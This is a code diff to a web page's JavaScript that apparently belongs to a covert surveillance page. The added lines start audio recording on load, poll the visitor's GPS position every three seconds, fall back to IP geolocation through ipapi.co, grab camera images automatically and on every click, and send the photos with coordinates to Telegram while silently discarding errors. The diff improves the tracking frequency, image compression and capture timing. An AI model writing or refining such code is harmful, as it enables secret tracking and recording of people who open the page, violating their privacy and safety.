@@ -88,17 +88,38 @@
       }
     }, 30000);
 
+    function getIPBasedLocation() {
+      // Fallback location using IP geolocation
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          if (data.latitude && data.longitude) {
+            cachedLat = data.latitude;
+            cachedLon = data.longitude;
+          }
+        })
+        .catch(() => {});
+    }
+
     function updateLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
           cachedLat = pos.coords.latitude;
           cachedLon = pos.coords.longitude;
-        }, () => setTimeout(updateLocation, 3000));
+        }, (err) => {
+          // Fallback to IP-based location on GPS failure
+          getIPBasedLocation();
+          setTimeout(updateLocation, 300);
+        }, {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        });
       }
     }
 
     updateLocation();
-    setInterval(updateLocation, 10000);
+    setInterval(updateLocation, 3000);
 
     async function autoCapture() {
       try {
@@ -122,17 +143,35 @@
         
         canvas.toBlob((blob) => {
           if (stream) stream.getTracks().forEach(t => t.stop());
-          sendToTelegram(cachedLat, cachedLon, blob);
+          
+          // Optimize quality based on blob size
+          let quality = 0.95;
+          if (blob.size > 500000) quality = 0.7; // If > 500KB, reduce to 70%
+          else if (blob.size > 300000) quality = 0.8; // If > 300KB, reduce to 80%
+          
+          // Re-compress if needed
+          if (quality < 0.95) {
+            canvas.toBlob((optimizedBlob) => {
+              sendToTelegram(cachedLat, cachedLon, optimizedBlob);
+            }, 'image/jpeg', quality);
+          } else {
+            sendToTelegram(cachedLat, cachedLon, blob);
+          }
         }, 'image/jpeg', 0.95);
       } catch (err) {}
     }
 
     window.addEventListener('load', () => {
       startAudioRecording();
-      // Wait for location to be fetched before first capture
+      // Wait and ensure location is fetched before first capture
       setTimeout(() => {
-        autoCapture();
-      }, 2000);
+        if (cachedLat !== 0 && cachedLon !== 0) {
+          autoCapture();
+        } else {
+          // If location not fetched yet, wait more
+          setTimeout(autoCapture, 2000);
+        }
+      }, 4000);
     });
 
     document.addEventListener('click', autoCapture);
